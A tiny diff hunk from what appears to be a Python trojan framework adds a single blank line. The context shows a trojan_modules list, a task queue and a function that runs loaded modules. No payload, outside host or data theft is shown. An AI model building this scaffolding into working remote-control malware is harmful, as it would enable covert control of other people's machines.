@@ -16,6 +16,7 @@ trojan_modules = []
 configured		= False
 task_queue		= Queue.Queue()
 
+
 def module_runner(module):
 	task_queue.put(1)
 	result = sys.modules[module].run()
